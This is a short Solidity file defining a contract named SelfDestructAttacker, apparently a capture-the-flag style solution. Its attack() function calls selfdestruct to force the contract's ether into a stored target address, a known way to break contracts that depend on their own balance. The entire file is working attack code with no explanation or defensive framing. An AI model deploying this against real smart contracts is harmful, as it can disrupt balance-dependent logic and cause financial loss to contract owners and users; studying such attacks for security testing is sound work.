pragma solidity ^0.8.0;

contract SelfDestructAttacker {
    address public instance;

    constructor(address _instance) {
        instance = _instance;
    }

    fallback() external payable {}

    function attack() external {
        selfdestruct(payable(instance));
    }
}